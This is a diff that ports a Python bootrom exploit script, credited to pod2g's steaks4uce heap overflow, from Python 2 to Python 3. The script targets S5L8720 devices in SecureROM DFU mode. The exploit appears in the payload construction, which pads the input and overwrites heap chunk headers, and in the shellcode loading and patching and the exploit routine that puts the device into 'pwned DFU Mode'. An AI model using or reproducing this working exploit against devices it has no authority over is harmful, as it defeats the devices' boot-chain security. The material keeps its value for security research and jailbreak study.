@@ -1,7 +1,7 @@
 # Credit: This file is based on steaks4uce exploit (heap overflow) by pod2g.
 
 import struct, sys, time
-import usb # pyusb: use 'pip install pyusb' to install this module
+import usb
 import dfu
 
 constants_240_4 = [
@@ -73,7 +73,7 @@ configs = [
 ]
 
 # Pad to length 256 and add heap data for overwrite
-payload = '\x00' * 256 + struct.pack('<14I',
+payload = b'\x00' * 256 + struct.pack('<14I',
               # 1. Allocated chunk to be freed
               # Chunk header: (size 0x8)
         0x84, #   0x00: previous_chunk
@@ -100,7 +100,6 @@ def generate_shellcode(constants):
   with open('bin/steaks4uce-shellcode.bin', 'rb') as f:
     shellcode = f.read()
 
-  # Shellcode has placeholder values for constants; check they match and replace with constants from config
   placeholders_offset = len(shellcode) - 4 * len(constants)
   for i in range(len(constants)):
     offset = placeholders_offset + 4 * i
@@ -110,17 +109,17 @@ def generate_shellcode(constants):
   return shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants)
 
 def exploit():
-  print '*** based on steaks4uce exploit (heap overflow) by pod2g ***'
+  print('*** based on steaks4uce exploit (heap overflow) by pod2g ***')
 
   device = dfu.acquire_device()
-  print 'Found:', device.serial_number
+  print('Found:', device.serial_number)
 
   if 'PWND:[' in device.serial_number:
-    print 'Device is already in pwned DFU Mode. Not executing exploit.'
+    print('Device is already in pwned DFU Mode. Not executing exploit.')
     return
 
   if 'CPID:8720' not in device.serial_number:
-    print 'ERROR: Not a compatible device. This exploit is for S5L8720 devices only. Exiting.'
+    print('ERROR: Not a compatible device. This exploit is for S5L8720 devices only. Exiting.')
     sys.exit(1)
 
   chosenConfig = None
@@ -130,8 +129,8 @@ def exploit():
       break
 
   if chosenConfig is None:
-    print 'ERROR: CPID is compatible, but serial number string does not match.'
-    print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'
+    print('ERROR: CPID is compatible, but serial number string does not match.')
+    print('Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.')
     sys.exit(1)
 
   dfu.reset_counters(device)
@@ -151,7 +150,7 @@ def exploit():
   dfu.release_device(device)
 
   if failed:
-    print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'
+    print('ERROR: Exploit failed. Device did not enter pwned DFU Mode.')
     sys.exit(1)
 
-  print 'Device is now in pwned DFU Mode.'
+  print('Device is now in pwned DFU Mode.')
